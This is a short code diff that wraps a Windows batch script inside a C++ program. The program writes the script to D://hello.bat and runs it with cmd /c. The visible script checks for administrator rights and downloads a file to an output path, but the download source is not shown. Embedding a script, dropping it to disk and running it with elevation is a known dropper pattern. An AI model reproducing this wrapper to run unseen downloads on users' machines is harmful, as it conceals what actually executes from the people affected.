@@ -1,4 +1,17 @@
-@echo off
+#include <iostream>
+#include <fstream>
+#include <string>
+#include <cstdlib>
+
+#ifndef _WIN32
+  #include <sys/stat.h>
+  #include <sys/wait.h>
+#endif
+
+int main() {
+#ifdef _WIN32
+    const std::string filePath = "D://hello.bat";
+    const std::string content = R"(@echo off
 :: Check for admin rights
 net session >nul 2>&1
 if %errorlevel% neq 0 (
@@ -36,4 +49,25 @@ if exist "%outPath%" (
     echo Download failed.
     pause
 )
+)";
 
+    std::ofstream ofs(filePath, std::ios::binary);
+    if (!ofs) {
+        std::cerr << "Khong the tao file: " << filePath << "\n";
+        return 1;
+    }
+    ofs << content;
+    ofs.close();
+
+    std::string cmd = "cmd /c \"" + filePath + "\"";
+    std::cout << "Dang chay: " << cmd << "\n";
+    int rc = std::system(cmd.c_str());
+    if (rc == -1) {
+        perror("system");
+        return 3;
+    }
+    std::cout << "Tien trinh ket thuc";
+    return 0;
+#else
+#endif
+}
